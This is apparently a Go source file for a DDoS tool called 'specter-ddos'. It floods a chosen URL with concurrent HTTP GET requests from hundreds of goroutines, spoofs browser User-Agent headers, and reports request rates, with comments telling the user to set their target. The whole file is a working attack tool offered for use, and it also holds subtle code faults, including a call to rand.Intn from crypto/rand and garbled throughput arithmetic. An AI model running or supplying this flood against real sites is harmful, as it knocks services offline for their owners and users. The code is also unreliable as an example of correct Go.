go
module specter-ddos

go 1.21

package main

import (
	"crypto/rand"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

// Config holds attack parameters
type Config struct {
	URL      string
	Threads  int
	Method   string // GET, POST
}

// SpecterEngine handles the concurrent attacks
type SpecterEngine struct {
	Config
	wg      sync.WaitGroup
	mu      sync.Mutex
	packets uint64
	startTime time.Time
	stopCh  chan struct{}
}

func NewSpecter(cfg Config) *SpecterEngine {
	return &SpecterEngine{
		Config:    cfg,
		startTime: time.Now(),
		stopCh:    make(chan struct{}),
	}
}

// generateRandomUserAgent creates a fake browser header
func generateRandomUserAgent() string {
	browsers := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
	}
	return browsers[rand.Intn(len(browsers))]
}

// sendRequest performs a single HTTP request
func (s *SpecterEngine) sendRequest() {
	defer s.wg.Done()

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	for {
		select {
		case <-s.stopCh:
			return
		default:
			req, err := http.NewRequest(s.Method, s.Config.URL, nil)
			if err != nil {
				continue
			}

			req.Header.Set("User-Agent", generateRandomUserAgent())
			req.Header.Set("Accept-Language", "en-US,en;q=0.9")
			req.Header.Set("Cache-Control", "no-cache")
			req.Header.Set("Connection", "keep-alive")

			resp, err := client.Do(req)
			if resp != nil {
				io.Copy(io.Discard, resp.Body) // Drain body to reuse connection
				resp.Body.Close()
			}
			
			s.mu.Lock()
			s.packets++
			s.mu.Unlock()
			
			// Small delay to prevent total CPU saturation if threads < cores
			time.Sleep(10 * time.Millisecond)
		}
	}
}

// Start launches the flood
func (s *SpecterEngine) Start() {
	fmt.Printf("[SPECTER] Starting %d threads against %s\n", s.Threads, s.Config.URL)
	fmt.Println("[SPECTER] Press Ctrl+C to stop.")

	// Setup graceful shutdown
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		fmt.Println("\n[SPECTER] Stopping...")
		close(s.stopCh)
		s.wg.Wait()
		os.Exit(0)
	}()

	// Launch threads
	for i := 0; i < s.Threads; i++ {
		s.wg.Add(1)
		go s.sendRequest()
	}

	// Monitor stats every second
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			s.mu.Lock()
			count := s.packets
			s.packets = 0 // Reset counter
			s.mu.Unlock()

			duration := time.Since(s.startTime).Seconds()
			if duration > 0 {
				ppm := float64(count) / duration
				totalPackets := count + (uint64(ppm)*uint64(duration))
				fmt.Printf("[SPECTER] Packets Sent: %d | PPS: %.2f | Total Time: %.1fs\n", 
					totalPackets, ppm, duration)
			}
		case <-s.stopCh:
			return
		}
	}
}

func main() {
	// Default config - CHANGE THESE VALUES
	cfg := Config{
		URL:      "http://example.com", // <<< CHANGE THIS TO YOUR TARGET
		Threads:  500,                  // <<< ADJUST BASED ON YOUR CPU CORES
		Method:   "GET",
	}

	engine := NewSpecter(cfg)
	engine.Start()
}
